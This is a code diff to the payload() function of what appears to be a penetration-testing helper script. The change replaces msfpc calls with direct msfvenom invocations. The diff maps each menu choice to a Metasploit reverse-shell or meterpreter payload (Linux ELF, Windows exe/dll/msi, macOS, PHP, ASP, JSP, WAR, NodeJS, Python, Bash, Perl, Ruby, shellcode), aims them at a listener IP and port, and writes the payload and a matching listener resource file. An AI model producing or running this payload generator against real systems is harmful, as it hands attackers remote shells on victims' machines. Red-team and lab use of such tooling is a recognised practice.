@@ -452,15 +452,15 @@ def payload():
         | #Binaries             |  #Web Payloads  |  #Scripting Payloads  |  #Shellcode         |
         |_______________________|_________________|_______________________|_____________________|
         |                       |                 |                       |                     |
-        | 1) Linux              | 7)  PHP         | 11) Python            | 15) Linux based     |
+        | 1) Linux              | 7)  PHP         | 12) Python            | 16) Linux based     |
         |                       |                 |                       |                     |
-        | 2) Windows (exe)      | 8)  ASP         | 12) Bash              | 16) Windows based   |
+        | 2) Windows (exe)      | 8)  ASP         | 13) Bash              | 17) Windows based   |
         |                       |                 |                       |                     |
-        | 3) Windows (dll)      | 9)  JSP         | 13) Perl              | 17) Mac based       |
+        | 3) Windows (dll)      | 9)  JSP         | 14) Perl              | 18) Mac based       |
         |                       |                 |                       |                     |
-        | 4) Windows (dll, x64) | 10) WAR         | 14) Ruby              |                     |
+        | 4) Windows (dll, x64) | 10) WAR         | 15) Ruby              |                     |
         |                       |                 |                       |                     |
-        | 5) Windows (msi)      | 11) Nodejs      |                       |                     |
+        | 5) Windows (msi)      | 11) NodeJS      |                       |                     |
         |                       |                 |                       |                     |
         | 6) Mac                |                 |                       |                     |
         |_______________________|_________________|_______________________|_____________________|
@@ -469,7 +469,7 @@ def payload():
     while True:
         ven = input("Enter payload: ")
         try:
-            if int(ven) < 1 or int(ven) > 17:
+            if int(ven) < 1 or int(ven) > 18:
                 raise ValueError
             break
         except ValueError:
@@ -477,17 +477,22 @@ def payload():
 
     ipp, port, _ = ask_listener()
 
-    msfpc_format = None
     msfvenom_command = None
     msfvenom_extension = None
     msfvenom_extra = ""
     # Binaries
     if ven == "1":
-        msfpc_format = "elf"
+        msfvenom_command = "linux/x86/meterpreter/reverse_tcp"
+        msfvenom_extension = "elf"
+        msfvenom_extra = "-f elf"
     elif ven == "2":
-        msfpc_format = "exe"
+        msfvenom_command = "windows/meterpreter/reverse_tcp"
+        msfvenom_extension = "exe"
+        msfvenom_extra = "-f exe"
     elif ven == "3":
-        msfpc_format = "dll"
+        msfvenom_command = "windows/meterpreter/reverse_tcp"
+        msfvenom_extension = "dll"
+        msfvenom_extra = "-f dll"
     elif ven == "4":
         msfvenom_command = "windows/x64/meterpreter/reverse_tcp"
         msfvenom_extension = "dll"
@@ -497,30 +502,48 @@ def payload():
         msfvenom_extension = "msi"
         msfvenom_extra = "-f msi"
     elif ven == "6":
-        msfpc_format = "macho"
+        msfvenom_command = "osx/x86/shell_reverse_tcp"
+        msfvenom_extension = "macho"
+        msfvenom_extra = "-f macho"
     # Web Payloads
     elif ven == "7":
-        msfpc_format = "php"
+        msfvenom_command = "php/meterpreter/reverse_tcp"
+        msfvenom_extension = "php"
+        msfvenom_extra = "-f raw"
     elif ven == "8":
-        msfpc_format = "asp"
+        msfvenom_command = "windows/meterpreter/reverse_tcp"
+        msfvenom_extension = "asp"
+        msfvenom_extra = "-f asp"
     elif ven == "9":
-        msfpc_format = "jsp"
+        msfvenom_command = "java/jsp_shell_reverse_tcp"
+        msfvenom_extension = "jsp"
+        msfvenom_extra = "-f raw"
     elif ven == "10":
-        msfpc_format = "war"
+        msfvenom_command = "java/jsp_shell_reverse_tcp"
+        msfvenom_extension = "war"
+        msfvenom_extra = "-f war"
     elif ven == "11":
         msfvenom_command = "nodejs/shell_reverse_tcp"
         msfvenom_extension = "js"
+        msfvenom_extra = "-f raw"
 
     # Scripting
     elif ven == "12":
-        msfpc_format = "python"
+        msfvenom_command = "python/meterpreter_reverse_tcp"
+        msfvenom_extension = "py"
+        msfvenom_extra = "-f raw"
     elif ven == "13":
-        msfpc_format = "bash"
+        msfvenom_command = "cmd/unix/reverse_bash"
+        msfvenom_extension = "sh"
+        msfvenom_extra = "-f raw"
     elif ven == "14":
-        msfpc_format = "perl"
+        msfvenom_command = "cmd/unix/reverse_perl"
+        msfvenom_extension = "pl"
+        msfvenom_extra = "-f raw"
     elif ven == "15":
         msfvenom_command = "ruby/shell_reverse_tcp"
         msfvenom_extension = "rb"
+        msfvenom_extra = "-f raw"
 
     # Shellcode
     elif ven == "16":
@@ -545,14 +568,7 @@ def payload():
         msfvenom_extra = f"-f {dil}"
         msfvenom_extension = dil
 
-    if msfpc_format:
-        msfpc = subprocess.run(["msfpc", msfpc_format, ipp, port], capture_output=True)
-        print(msfpc.stdout.decode("utf-8"))
-        spawn_shell = (
-            msfpc.stdout.decode("utf-8").split("Run: ")[1].splitlines()[0].split(" ")
-        )
-        spawn_shell[-1] = spawn_shell[-1].replace("'", "")
-    elif msfvenom_command and msfvenom_extension:
+    if msfvenom_command and msfvenom_extension:
         payload = f'{msfvenom_command.replace("/", "-").replace("_", "-")}-{port}.{msfvenom_extension}'
         with open(os.path.join(os.getcwd(), payload), "wb") as output:
             command = [
@@ -563,7 +579,7 @@ def payload():
                 f"LPORT={port}",
             ]
             command.extend(msfvenom_extra.split(" "))
-            Popen(command, stdout=output)
+            Popen(command, stdout=output, stderr=None)
         print(f"Payload created: {os.getcwd()}/{payload}")
         msfvenom_rc = f'{msfvenom_command.replace("/", "-").replace("_", "-")}-{port}-{msfvenom_extension}.rc'
         with open(msfvenom_rc, "w") as rc:
